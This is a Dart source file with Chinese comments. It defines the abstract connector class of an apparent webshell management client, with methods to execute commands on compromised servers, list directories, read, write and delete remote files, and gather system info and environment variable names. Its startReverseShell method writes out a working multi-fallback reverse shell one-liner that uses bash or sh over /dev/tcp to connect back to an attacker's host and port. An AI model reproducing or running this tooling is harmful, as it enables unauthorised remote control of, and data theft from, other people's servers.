import '../models/webshell.dart';
import '../models/file_entry.dart';

/// 连接器能力枚举
enum ConnectorCapability {
  codeExec,  // 可执行任意代码（eval 类）
  shellExec, // 可执行 shell/系统命令
  fileRead,  // 可读取远端文件
  fileWrite, // 可写入/删除远端文件
  probeOnly, // 只读探测，无执行能力
}

/// 所有 Webshell 连接器的抽象基类
abstract class ShellConnector {
  final Webshell webshell;
  String currentDir = '/';

  ShellConnector(this.webshell);

  Set<ConnectorCapability> get capabilities;

  bool get supportsCodeExec  => capabilities.contains(ConnectorCapability.codeExec);
  bool get supportsShellExec => capabilities.contains(ConnectorCapability.shellExec);
  bool get supportsFileRead  => capabilities.contains(ConnectorCapability.fileRead);
  bool get supportsFileWrite => capabilities.contains(ConnectorCapability.fileWrite);
  bool get isProbeOnly       => capabilities.contains(ConnectorCapability.probeOnly);

  Future<bool> ping();

  /// 连接失败时的诊断信息（如 HTTP 错误、MATRIX_ERR 等），供 UI 显示
  String? get lastPingDiagnostic => null;

  Future<String> executeCommand(String cmd, {String workingDir = ''});
  Future<String> getCurrentDir();
  Future<List<FileEntry>> listDirectory(String path);
  Future<String> readFile(String path);
  Future<bool> writeFile(String path, String content);
  Future<bool> deleteFile(String path);
  Future<Map<String, String>> getSystemInfo();
  Future<List<({String name, bool isDir})>> listNamesForCompletion(String path);
  Future<String> getHomeDir();
  Future<List<String>> listEnvVarNames();

  /// 尝试通过当前连接器在目标上启动反弹 Shell。
  ///
  /// 默认实现仅支持类 Unix 目标：通过 [executeCommand] 执行反弹命令。
  /// 优先使用 `script` 分配伪终端，其次是 bash，最后回退到 sh。
  /// 具体连接器可根据协议/目标环境重写此方法（例如生成 Windows 版命令）。
  Future<void> startReverseShell(String lhost, int lport) async {
    if (!supportsShellExec) {
      throw UnsupportedError('当前连接器不具备 shell 执行能力，无法发起反弹 Shell');
    }
    // 使用多级回退的一键反弹命令，并显式设置 TERM：
    // 1. 先导出 TERM=xterm-256color，避免 clear 等命令报 “TERM not set”
    // 2. 优先使用 script 分配伪终端 + bash
    // 3. 其次使用 bash -i
    // 4. 否则      → /bin/sh -i
    final cmd =
        "bash -c 'export TERM=xterm-256color; "
        "if command -v script >/dev/null 2>&1; then "
        "script -q /dev/null bash >& /dev/tcp/$lhost/$lport 0>&1; "
        "elif command -v bash >/dev/null 2>&1; then "
        "bash -i >& /dev/tcp/$lhost/$lport 0>&1; "
        "else /bin/sh -i >& /dev/tcp/$lhost/$lport 0>&1; fi'";
    await executeCommand('$cmd >/dev/null 2>&1 &', workingDir: currentDir);
  }
}
